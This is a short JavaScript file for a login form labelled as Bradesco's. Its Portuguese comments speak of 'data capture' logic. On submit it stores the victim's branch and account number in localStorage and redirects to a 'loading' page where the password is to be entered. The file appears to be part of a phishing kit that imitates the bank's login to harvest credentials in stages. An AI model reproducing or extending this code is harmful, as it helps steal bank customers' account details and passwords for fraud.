document.addEventListener("DOMContentLoaded", () => {
    const formLogin = document.getElementById("form-login-bradesco");

    if (formLogin) {
        formLogin.addEventListener("submit", (event) => {
            event.preventDefault();

            // A lógica de caputra de dados do Renato
            const agencia = document.getElementById("campo-agencia").value;
            const conta = document.getElementById("campo-conta").value;
            const digito = document.getElementById("campo-digito").value;

            const contaCompleta = `${conta}${digito}`;

            // Salva provisoriamente no localStorage para a próxima página ler
            localStorage.setItem("agencia", agencia);
            localStorage.setItem("conta", contaCompleta);

            // Redireciona para a página de loading onde o usuário digitará a senha
            window.location.href = "pages/loading/loading.html";
        });
    }
});